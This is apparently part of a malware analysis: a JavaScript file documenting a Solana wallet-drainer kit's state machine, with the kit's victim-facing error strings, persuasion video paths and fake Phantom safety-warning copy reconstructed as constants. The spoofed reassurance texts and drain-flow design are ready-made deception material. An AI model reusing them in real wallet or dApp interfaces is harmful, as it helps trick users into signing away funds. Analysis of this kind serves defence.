/**
 * Flow state machine and error messages.
 *
 * The kit uses a central state object (original name: 信()/屭) that
 * tracks the whole drain attempt. This file documents every state field,
 * error message, and retry path recovered from the string table and
 * constants array.
 *
 * === State object structure (top-level fields) ===
 *
 * Most 2-char field names come from the constants array. The critical
 * ones (from constants + string table cross-reference):
 *
 *   state.b          connected wallet object (from AppKit)
 *   state.b.e        victim wallet public key (string, base58)
 *   state.c          config object
 *   state.c.Se       apiHost — the operator's backend hostname
 *   state.c.ne       attempt counter (global retry count, 屭.ne)
 *   state.K          configured SOL amount in lamports (from setSolAmount)
 *   state.he         "flow entry" — per-drain attempt state
 *   state.he.be      flow type byte (0 = main drain, 1 = SIWS verify, 2 = 200tx spam)
 *   state.he.ie      flag: skip self-broadcast (operator handles it)
 *   state.he.lr      account list for /c/i payload (encodeAccounts input)
 *   state.he.Fe      account list for /process payload
 *   state.he.de / .e  per-entry pubkeys in account lists
 *   state.he.J        flag byte in type-0 account entries
 *   state.he.q        second pubkey in type-0 account entries
 *
 * === Flow type bytes (state.he.be) ===
 *
 *   0  — standard drain (token sweep + SOL drain via operator program)
 *   1  — SIWS "verify ownership" flow (signMessage)
 *   2  — 200-tx spam flow (mass-sign prompt)
 *
 * === Retry / error message table ===
 *
 * String table errors shown to the victim at each failure point:
 *
 * | String index | Message | Trigger |
 * |---|---|---|
 * | 1033 | "Top-up your balance by at least {N} SOL" | balance gate fail |
 * | 1034 | "You can't perform any actions from this account because you're not it's owner" | watch address |
 * | 1035 | "Connect another account" | UI button after any account error |
 * | 1036 | "Transaction was reverted, funds will be refunded soon. Please try again." | tx submit failure |
 * | 1037 | "Something went wrong" | generic error header |
 * | 1038 | "Something went wrong. Please check your internet connection or try later." | network error |
 * | 1039 | "Critical error occurred" | unrecoverable error |
 * | 1040 | "This account is used as target account. Please connect another" | operator address connected |
 * | 1041 | "The transaction has expired" | blockhash too old (> 150 slots) |
 * | 1042 | "Please sign it one more time to continue" | tx expired retry prompt |
 * | 1043 | "Please allow one more verification step" | SIWS verification retry |
 * | 1051 | 'This account is not a plain wallet. Please do not connect "Watch Addresses".' | non-system account |
 *
 * === Video playback (persuasion) ===
 *
 * String indices for the persuasion video paths:
 *   [1044] "/_nuxt/media/"              — base path
 *   [1045] "malicious.webm"             — 10.8s "proof of incoming transaction"
 *   [1046] "200tx.webm"                 — 11.0s video played during the 200-tx flow
 *   [1047] "refund.webm"                — 8.0s "refund is coming" after reverted tx
 *
 * Video play triggers:
 *   - malicious.webm: shown in the fake "Confirm Transaction" dialog before
 *     the first signTransaction call
 *   - 200tx.webm: shown in the mass-sign modal (flow type 2) alongside the
 *     "Transactions are reverted" copy [444]
 *   - refund.webm: shown after a signing rejection or tx failure alongside
 *     getString(1036) "Transaction was reverted, funds will be refunded soon."
 *
 * === Phantom-spoofing copy (strings 1048–1050) ===
 *
 * These strings are injected into the kit's own fake modal to impersonate
 * Phantom wallet's safety warnings:
 *
 * [1048] "This application hasn't been reviewed by Phantom yet, but it is
 *         listed in trusted community-maintained safety databases. You can
 *         proceed with confidence — this app is recognized as safe."
 *   → Spoofs Phantom's "unreviewed app" warning (the real Phantom shows
 *     a negative warning; this fake version turns it positive)
 *
 * [1049] "This dApp uses a new, optimized transaction delivery method that
 *         is not yet displayed correctly in Phantom. You can proceed with
 *         confidence — this app is recognized as safe."
 *   → Covers for the "incoming transfer" preview not appearing correctly
 *     (because the decoy legs are built to preview as incoming but the
 *     kit's own dialog shows them first)
 *
 * [1050] "This dApp uses Abuse Protection to prevent misuse of platform.
 *         You'll need to complete a quick verification of your transaction
 *         history. It's completely safe and only takes a few seconds."
 *   → The "Abuse Protection" framing for the SIWS verify step
 *
 * === blockhash validity window ===
 *
 * From constants:
 *   432000 slots (~2 days) = the Solana blockhash validity window
 *   The kit tracks lastValidBlockHeight from every RPC response. When the
 *   current slot exceeds lastValidBlockHeight, it fetches a fresh blockhash
 *   and re-signs, showing getString(1042) "Please sign it one more time."
 *
 * === Global attempt counter (屭.ne) ===
 *
 * Incremented on every /api/process call. Sent in the /process body header
 * (bytes 13–16, u32 LE). Allows the operator to detect multi-attempt victims
 * and audit retry behavior.
 */

// Error message constants (from string table)
const ERROR_MSGS = {
  topup:        "Top-up your balance by at least ", // + SOL amount
  not_owner:    "You can't perform any actions from this account because you're not it's owner",
  connect_other: "Connect another account",
  reverted:     "Transaction was reverted, funds will be refunded soon. Please try again.",
  generic:      "Something went wrong",
  network:      "Something went wrong. Please check your internet connection or try later.",
  critical:     "Critical error occurred",
  target:       "This account is used as target account. Please connect another",
  expired:      "The transaction has expired",
  resign:       "Please sign it one more time to continue",
  verify_again: "Please allow one more verification step",
  watch_addr:   "This account is not a plain wallet. Please do not connect \"Watch Addresses\".",
};

// Video paths (string table)
const MEDIA_BASE = "/_nuxt/media/";   // getString(1044)
const VIDEOS = {
  malicious: MEDIA_BASE + "malicious.webm", // getString(1045) — 10.8s
  spam200:   MEDIA_BASE + "200tx.webm",     // getString(1046) — 11.0s
  refund:    MEDIA_BASE + "refund.webm",    // getString(1047) — 8.0s
};

// Phantom-spoof modal copy (string table)
const PHANTOM_COPY = {
  unreviewed: "This application hasn't been reviewed by Phantom yet, but it is listed in trusted community-maintained safety databases. You can proceed with confidence — this app is recognized as safe.", // [1048]
  delivery:   "This dApp uses a new, optimized transaction delivery method that is not yet displayed correctly in Phantom. You can proceed with confidence — this app is recognized as safe.", // [1049]
  abuse:      "This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.", // [1050]
};

// Flow type byte values
const FLOW = {
  DRAIN:  0,  // state.he.be = 0: main token+SOL drain
  SIWS:   1,  // state.he.be = 1: sign-in-with-solana "verify" step
  SPAM:   2,  // state.he.be = 2: 200-tx mass-sign flood
};

// Initial state factory
function createState(apiHost) {
  return {
    b: null,          // connected wallet (set on connect)
    c: {
      Se: apiHost,    // operator host
      ne: 0,          // attempt counter
    },
    K: 0,             // configured SOL amount in lamports
    he: null,         // per-attempt flow state (set at drain start)
  };
}
